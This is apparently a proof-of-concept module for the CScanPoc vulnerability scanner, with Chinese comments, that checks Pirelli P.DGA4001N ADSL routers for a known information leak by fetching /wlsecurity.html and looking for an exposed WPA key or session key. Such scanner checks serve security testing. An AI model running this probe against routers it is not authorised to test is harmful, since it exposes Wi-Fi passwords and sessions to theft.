# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Pirelli_0101'  # 平台漏洞编号，留空
    name = 'Pirelli ADSL2/2+ Wireless Router P.DGA4001N 信息泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-01-08'  # 漏洞公布时间
    desc = '''
    Tested on firmware version PDG_TEF_SP_4.06L.6.
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/35721/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Pirelli'  # 漏洞应用名称
    product_version = 'ADSL2/2+'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cd63f4e7-a307-42d5-9a6a-43463b3c6dd1'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = "%s/wlsecurity.html" % self.target
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "var wpaPskKey = '" in content or "var sessionKey" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
